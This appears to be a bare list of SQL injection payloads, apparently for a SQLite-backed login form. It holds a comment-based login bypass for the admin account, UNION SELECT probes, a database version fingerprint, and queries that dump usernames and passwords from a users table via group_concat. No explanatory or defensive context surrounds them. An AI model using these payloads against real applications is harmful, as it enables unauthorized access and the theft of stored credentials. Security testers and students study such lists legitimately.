admin'--
' UNION SELECT 1, 'HACKED', 'teste' --
' UNION SELECT 1, password, '3' FROM users WHERE username='admin' --
' UNION SELECT 1, sqlite_version(), '3' --
' UNION SELECT 1, group_concat(username, password, '3, '), '3' FROM users --
' UNION SELECT 1, group_concat(username || ':' || password, ' | '), '3' FROM users --